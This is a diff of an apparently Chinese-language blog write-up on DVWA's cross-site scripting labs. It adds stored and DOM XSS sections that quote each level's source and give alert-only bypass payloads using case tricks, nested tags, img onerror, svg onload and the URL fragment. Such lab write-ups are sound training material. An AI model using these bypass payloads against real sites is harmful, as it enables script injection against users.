@@ -89,7 +89,7 @@
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://note.youdao.com/yws/public/resource/d3683fa94232055e03f13336d3062b10/xmlnote/A17DC680B4804465A2A5E98D97552993/24790">
 <meta property="og:image" content="https://note.youdao.com/yws/public/resource/8db29440a015425652c42a4e14993260/xmlnote/FB73F27BDB4343158F446E21017EBC7E/24801">
-<meta property="og:updated_time" content="2018-07-08T10:00:24.211Z">
+<meta property="og:updated_time" content="2018-07-09T01:30:48.505Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="DVWA-XSS">
 <meta name="twitter:description" content="XSS(Cross-Site Script)原理攻击者将恶意代码插入到web页面，若服务器端未进行有效过滤，当用户浏览该页面时，插入的代码就会在用户的浏览器中执行 攻击发生在客户端，攻击目标是最终用户的浏览器 恶意代码通常为：危险的HTML标签、客户端脚本、能执行JS的容器等 存在用户输入点的位置，都可能存在跨站漏洞 分类DOM型：页面本身包含一些DOM对象的操作，如果未对输入的参数进行处理，可通">
@@ -390,11 +390,10 @@ if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apo
 } 
 
 ?&gt; 
-</code></pre><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>使用函数str_replace函数(<strong>该函数区分大小写，而且只替换一次</strong>)将参数name中的<script>字符串替换为空，这里使用大小写绕过或者嵌套</p>
-<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><pre><code>&lt;Script&gt;alert(/xss/)&lt;/script&gt;
+</code></pre><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>使用函数str_replace函数(<strong>该函数区分大小写，而且只替换一次</strong>)将参数name中的&lt;script字符串替换为空，这里使用大小写绕过或者嵌套</p>
+<h4 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h4><pre><code>&lt;Script&gt;alert(/xss/)&lt;/script&gt;
 &lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/script&gt;
-</code></pre><p>验证成功</p>
-<h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><h4 id="Reflected-XSS-Source-2"><a href="#Reflected-XSS-Source-2" class="headerlink" title="Reflected XSS Source"></a>Reflected XSS Source</h4><pre><code>&lt;?php 
+</code></pre><h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><h4 id="Reflected-XSS-Source-2"><a href="#Reflected-XSS-Source-2" class="headerlink" title="Reflected XSS Source"></a>Reflected XSS Source</h4><pre><code>&lt;?php 
 
 // Is there any input? 
 if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { 
@@ -407,7 +406,7 @@ if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apo
 
 ?&gt; 
 </code></pre><h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p>使用正则表达式将&lt;script顺序出现的<strong>大小写</strong>或者<strong>嵌套形式</strong>出现的过滤掉,这里只是script标签，可以<strong>使用一些能够执行JavaScript代码的JavaScript事件</strong></p>
-<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><pre><code>&lt;img src=# onerror=alert(&quot;xss&quot;)&gt;
+<h4 id="Payload-2"><a href="#Payload-2" class="headerlink" title="Payload"></a>Payload</h4><pre><code>&lt;img src=# onerror=alert(&quot;xss&quot;)&gt;
 </code></pre><p>通过加载一个不存在的图片出错出发javascript onerror事件，验证存在XSS</p>
 <h3 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h3><h4 id="Reflected-XSS-Source-3"><a href="#Reflected-XSS-Source-3" class="headerlink" title="Reflected XSS Source"></a>Reflected XSS Source</h4><pre><code>&lt;?php 
 
@@ -428,9 +427,198 @@ generateSessionToken();
 
 ?&gt; 
 </code></pre><h4 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h4><p>这里对参数name进行了预定义字符实体化</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.freebuf.com/articles/web/157953.html">通过DVWA学习XSS</a></p>
-<p><a href="http://www.freebuf.com/articles/web/129308.html">绕过DVWA所有安全级别的XSS Payload</a></p>
-</script></p>
+<h2 id="Vulnerability-Stored-Cross-Site-Scripting-XSS"><a href="#Vulnerability-Stored-Cross-Site-Scripting-XSS" class="headerlink" title="Vulnerability: Stored Cross Site Scripting (XSS)"></a>Vulnerability: Stored Cross Site Scripting (XSS)</h2><h3 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h3><h4 id="Stored-XSS-Source"><a href="#Stored-XSS-Source" class="headerlink" title="Stored XSS Source"></a>Stored XSS Source</h4><pre><code>&lt;?php 
+
+if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { 
+    // Get input 
+    $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); 
+    $name    = trim( $_POST[ &apos;txtName&apos; ] ); 
+
+    // Sanitize message input 
+    $message = stripslashes( $message ); 
+    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); 
+
+    // Sanitize name input 
+    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); 
+
+    // Update database 
+    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; 
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );
+
+    //mysql_close(); 
+} 
+
+?&gt; 
+</code></pre><h4 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h4><p>前面进行了数据库连接操作，对参数mtxMessage传递的数据只进行了stripslashes()函数（删除反斜杠）处理，对txtname参数的长度为10，然后就将两个参数传递的数据存储到了数据库中</p>
+<h4 id="Payload-3"><a href="#Payload-3" class="headerlink" title="Payload"></a>Payload</h4><pre><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;
+</code></pre><p>可以看到每次点到这个页面时都会触发</p>
+<h3 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h3><h4 id="Stored-XSS-Source-1"><a href="#Stored-XSS-Source-1" class="headerlink" title="Stored XSS Source"></a>Stored XSS Source</h4><pre><code>&lt;?php 
+
+if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { 
+    // Get input 
+    $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); 
+    $name    = trim( $_POST[ &apos;txtName&apos; ] ); 
+
+    // Sanitize message input 
+    $message = strip_tags( addslashes( $message ) ); 
+    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); 
+    $message = htmlspecialchars( $message ); 
+
+    // Sanitize name input 
+    $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name ); 
+    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); 
+
+    // Update database 
+    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; 
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );
+
+    //mysql_close(); 
+} 
+
+?&gt; 
+</code></pre><h4 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h4><h4 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h4><pre><code>trim() 用于去除字符串两端的空白字符
+strip_tags() 剥去字符串中的 HTML、XML 以及 PHP 的标签。
+addslashes() 返回在预定义字符(单引号、双引号、反斜杠、NULL)之前添加反斜杠的字符串。
+htmlspecialchars() 把预定义的字符 &quot;&lt;&quot; （小于）和 &quot;&gt;&quot; （大于）转换为 HTML 实体， 转换为实体常用于防止浏览器将其用作 HTML 元素
+str_replace(&apos;&lt;script&gt;&apos;) 以其他字符替换字符串中的一些字符（区分大小写）且只替换一次
+</code></pre><p>首先对传进来的值去除了两端的空白字符，将message变量的值中的预定义字符前添加了反斜杠，并转为了html实体，变量name把<script>替换了一次，且不区分大小写,这里要注意在客户端限制了输入的字符数，我们看到两个输入框，但是对name的限制更小，用firebug把输入十个字符的限制在客户端改成100。</p>
+<h4 id="Payload-4"><a href="#Payload-4" class="headerlink" title="Payload"></a>Payload</h4><pre><code>&lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/script&gt;
+&lt;Script&gt;alert(/xss/)&lt;/script&gt;
+</code></pre><h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><h3 id="Stored-XSS-Source-2"><a href="#Stored-XSS-Source-2" class="headerlink" title="Stored XSS Source"></a>Stored XSS Source</h3><pre><code>&lt;?php 
+
+if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { 
+    // Get input 
+    $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); 
+    $name    = trim( $_POST[ &apos;txtName&apos; ] ); 
+
+    // Sanitize message input 
+    $message = strip_tags( addslashes( $message ) ); 
+    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); 
+    $message = htmlspecialchars( $message ); 
+
+    // Sanitize name input 
+    $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name ); 
+    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); 
+
+    // Update database 
+    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; 
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );
+
+    //mysql_close(); 
+} 
+
+?&gt; 
+</code></pre><h4 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h4><p>对参数message，去除两端的空白字符，对预定义字符转义，并转换为html实体<br>对参数name，使用正则把顺序为&lt;script的字符串的大小写，嵌套都过滤了，这里使用能够执行JavaScript的事件来执行,绕过方法与与前面反射型相似，通过不存在的图片触发 onerror事件执行</p>
+<h4 id="Payload-5"><a href="#Payload-5" class="headerlink" title="Payload"></a>Payload</h4><pre><code>&lt;img src=# onerror=&quot;alert(/high xss/)&quot;&gt;
+</code></pre><h3 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h3><h4 id="Stored-XSS-Source-3"><a href="#Stored-XSS-Source-3" class="headerlink" title="Stored XSS Source"></a>Stored XSS Source</h4><pre><code>&lt;?php 
+
+if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { 
+    // Check Anti-CSRF token 
+    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); 
+
+    // Get input 
+    $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); 
+    $name    = trim( $_POST[ &apos;txtName&apos; ] ); 
+
+    // Sanitize message input 
+    $message = stripslashes( $message ); 
+    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); 
+    $message = htmlspecialchars( $message ); 
+
+    // Sanitize name input 
+    $name = stripslashes( $name ); 
+    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); 
+    $name = htmlspecialchars( $name ); 
+
+    // Update database 
+    $data = $db-&gt;prepare( &apos;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&apos; ); 
+    $data-&gt;bindParam( &apos;:message&apos;, $message, PDO::PARAM_STR ); 
+    $data-&gt;bindParam( &apos;:name&apos;, $name, PDO::PARAM_STR ); 
+    $data-&gt;execute(); 
+} 
+
+// Generate Anti-CSRF token 
+generateSessionToken(); 
+
+?&gt; 
+</code></pre><h4 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h4><p>此处将message和name两个参数全部进行了html实体化，且绑定了变量将sql语句预处理</p>
+<h2 id="Vulnerability-DOM-Based-Cross-Site-Scripting-XSS"><a href="#Vulnerability-DOM-Based-Cross-Site-Scripting-XSS" class="headerlink" title="Vulnerability: DOM Based Cross Site Scripting (XSS)"></a>Vulnerability: DOM Based Cross Site Scripting (XSS)</h2><h3 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h3><p>在服务端没有代码，客户端的源代码</p>
+<pre><code>&lt;form name=&quot;XSS&quot; method=&quot;GET&quot;&gt;
+    &lt;select name=&quot;default&quot;&gt;
+        &lt;script&gt;
+            if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) {
+                var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);
+                document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;);
+                document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;);
+            }
+
+            document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;);
+            document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;);
+            document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;);
+            document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;);
+        &lt;/script&gt;
+    &lt;/select&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;Select&quot; /&gt;
+&lt;/form&gt;
+</code></pre><h3 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h3><pre><code>&lt;form name=&quot;XSS&quot; method=&quot;GET&quot;&gt;
+    &lt;select name=&quot;default&quot;&gt;
+        &lt;script&gt;
+            if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) {
+                var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);
+                document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;);
+                document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;);
+            }
+
+            document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;);
+            document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;);
+            document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;);
+            document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;);
+        &lt;/script&gt;
+    &lt;/select&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;Select&quot; /&gt;
+&lt;/form&gt;
+
+
+stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）,这里过滤了&lt;script标签且大小形式了过滤了
+</code></pre><h4 id="Payload-6"><a href="#Payload-6" class="headerlink" title="Payload"></a>Payload</h4><h5 id="方式1"><a href="#方式1" class="headerlink" title="方式1"></a>方式1</h5><p>url中有一个字符为#，该字符后的数据不会发送到服务器端，从而绕过服务端过滤<br>    ?#default=<script>alert(/dom-xss-medium/)</script></p>
+<h5 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h5><p>或者就是用img标签或其他标签的特性去执行js代码，比如img标签的onerror事件，构造链接，要注意闭合</p>
+<pre><code>img标签onerror事件加载
+document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;);
+
+&lt;/option&gt;&lt;/select&gt;&lt;option&gt;&lt;img src=# onerror=&quot;alert(&quot;xss&quot;)&quot;&gt;
+</code></pre><p>同样的标签还有svg，svg的onload事件同样可以在页面加载时执行js代码，产生弹框的效果</p>
+<pre><code>&lt;/option&gt;&lt;/select&gt;&lt;option&gt;&lt;svg onload=&quot;alert(&quot;xss&quot;)&quot;&gt;
+</code></pre><h3 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h3><h4 id="Vulnerability-Source"><a href="#Vulnerability-Source" class="headerlink" title="Vulnerability Source"></a>Vulnerability Source</h4><pre><code>&lt;?php 
+
+// Is there any input? 
+if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) {
+
+    # White list the allowable languages 
+    switch ($_GET[&apos;default&apos;]) { 
+        case &quot;French&quot;: 
+        case &quot;English&quot;: 
+        case &quot;German&quot;: 
+        case &quot;Spanish&quot;: 
+            # ok 
+            break; 
+        default: 
+            header (&quot;location: ?default=English&quot;); 
+            exit; 
+    } 
+} 
+
+?&gt; 
+</code></pre><h4 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h4><p>服务端使用了case语句进行判断，不能再通过其他JavaScript事件来绕过了<br>这里我们使用 # 来跳过服务端检查</p>
+<h4 id="Payload-7"><a href="#Payload-7" class="headerlink" title="Payload"></a>Payload</h4><pre><code>#?default=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;
+</code></pre><p>验证成功</p>
+<h3 id="Impossible-2"><a href="#Impossible-2" class="headerlink" title="Impossible"></a>Impossible</h3><h4 id="Vulnerability-Source-1"><a href="#Vulnerability-Source-1" class="headerlink" title="Vulnerability Source"></a>Vulnerability Source</h4><pre><code>&lt;?php 
+
+# Don&apos;t need to do anything, protction handled on the client side
+
+?&gt; 
+</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.freebuf.com/articles/web/157953.html" target="_blank" rel="noopener">通过DVWA学习XSS</a></p>
+<p><a href="http://www.freebuf.com/articles/web/129308.html" target="_blank" rel="noopener">绕过DVWA所有安全级别的XSS Payload</a></p>
+
       
     </div>
     
@@ -595,7 +783,7 @@ generateSessionToken();
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-Cross-Site-Script"><span class="nav-number">1.</span> <span class="nav-text">XSS(Cross-Site Script)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理"><span class="nav-number">1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分类"><span class="nav-number">1.2.</span> <span class="nav-text">分类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#DOM型："><span class="nav-number">1.2.1.</span> <span class="nav-text">DOM型：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反射型："><span class="nav-number">1.2.2.</span> <span class="nav-text">反射型：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#存储型："><span class="nav-number">1.2.3.</span> <span class="nav-text">存储型：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vulnerability-Reflected-Cross-Site-Scripting-XSS"><span class="nav-number">2.</span> <span class="nav-text">Vulnerability: Reflected Cross Site Scripting (XSS)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Low"><span class="nav-number">2.1.</span> <span class="nav-text">Low</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#关键代码"><span class="nav-number">2.1.1.</span> <span class="nav-text">关键代码</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Reflected-XSS-Source"><span class="nav-number">2.1.1.1.</span> <span class="nav-text">Reflected XSS Source</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分析"><span class="nav-number">2.1.2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Payload"><span class="nav-number">2.1.3.</span> <span class="nav-text">Payload:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用"><span class="nav-number">2.1.4.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Medium"><span class="nav-number">2.2.</span> <span class="nav-text">Medium</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Reflected-XSS-Source-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">Reflected XSS Source</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分析-1"><span class="nav-number">2.2.2.</span> <span class="nav-text">分析</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-Cross-Site-Script"><span class="nav-number">1.</span> <span class="nav-text">XSS(Cross-Site Script)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理"><span class="nav-number">1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分类"><span class="nav-number">1.2.</span> <span class="nav-text">分类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#DOM型："><span class="nav-number">1.2.1.</span> <span class="nav-text">DOM型：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反射型："><span class="nav-number">1.2.2.</span> <span class="nav-text">反射型：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#存储型："><span class="nav-number">1.2.3.</span> <span class="nav-text">存储型：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vulnerability-Reflected-Cross-Site-Scripting-XSS"><span class="nav-number">2.</span> <span class="nav-text">Vulnerability: Reflected Cross Site Scripting (XSS)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Low"><span class="nav-number">2.1.</span> <span class="nav-text">Low</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#关键代码"><span class="nav-number">2.1.1.</span> <span class="nav-text">关键代码</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Reflected-XSS-Source"><span class="nav-number">2.1.1.1.</span> <span class="nav-text">Reflected XSS Source</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分析"><span class="nav-number">2.1.2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Payload"><span class="nav-number">2.1.3.</span> <span class="nav-text">Payload:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用"><span class="nav-number">2.1.4.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Medium"><span class="nav-number">2.2.</span> <span class="nav-text">Medium</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Reflected-XSS-Source-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">Reflected XSS Source</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分析-1"><span class="nav-number">2.2.2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Payload-1"><span class="nav-number">2.2.3.</span> <span class="nav-text">Payload</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#High"><span class="nav-number">2.3.</span> <span class="nav-text">High</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Reflected-XSS-Source-2"><span class="nav-number">2.3.1.</span> <span class="nav-text">Reflected XSS Source</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分析-2"><span class="nav-number">2.3.2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Payload-2"><span class="nav-number">2.3.3.</span> <span class="nav-text">Payload</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Impossible"><span class="nav-number">2.4.</span> <span class="nav-text">Impossible</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Reflected-XSS-Source-3"><span class="nav-number">2.4.1.</span> <span class="nav-text">Reflected XSS Source</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分析-3"><span class="nav-number">2.4.2.</span> <span class="nav-text">分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vulnerability-Stored-Cross-Site-Scripting-XSS"><span class="nav-number">3.</span> <span class="nav-text">Vulnerability: Stored Cross Site Scripting (XSS)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Low-1"><span class="nav-number">3.1.</span> <span class="nav-text">Low</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Stored-XSS-Source"><span class="nav-number">3.1.1.</span> <span class="nav-text">Stored XSS Source</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分析-4"><span class="nav-number">3.1.2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Payload-3"><span class="nav-number">3.1.3.</span> <span class="nav-text">Payload</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Medium-1"><span class="nav-number">3.2.</span> <span class="nav-text">Medium</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Stored-XSS-Source-1"><span class="nav-number">3.2.1.</span> <span class="nav-text">Stored XSS Source</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分析-5"><span class="nav-number">3.2.2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#关键函数"><span class="nav-number">3.2.3.</span> <span class="nav-text">关键函数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#方法2"><span class="nav-number">3.2.3.1.</span> <span class="nav-text">方法2</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#High-2"><span class="nav-number">3.3.</span> <span class="nav-text">High</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Vulnerability-Source"><span class="nav-number">3.3.1.</span> <span class="nav-text">Vulnerability Source</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分析-8"><span class="nav-number">3.3.2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Payload-7"><span class="nav-number">3.3.3.</span> <span class="nav-text">Payload</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Impossible-2"><span class="nav-number">3.4.</span> <span class="nav-text">Impossible</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Vulnerability-Source-1"><span class="nav-number">3.4.1.</span> <span class="nav-text">Vulnerability Source</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">4.</span> <span 